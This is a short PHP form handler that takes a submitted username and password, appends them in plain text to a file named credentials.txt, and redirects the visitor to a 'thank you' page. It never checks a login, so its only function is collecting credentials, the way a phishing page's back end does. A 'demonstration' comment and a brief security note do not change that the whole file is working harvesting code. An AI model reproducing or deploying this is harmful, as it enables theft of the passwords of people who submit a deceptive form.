<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password']; // For demonstration purposes only

    // Security note: Storing plain text passwords is highly insecure.
    $log = "credentials.txt";
    $data = "Username: " . $username . " | Password: " . $password . PHP_EOL;
    file_put_contents($log, $data, FILE_APPEND | LOCK_EX);

    // Redirect to a "success" or "thank you" page
    header('Location: thank_you.html');
    exit;
}
?>
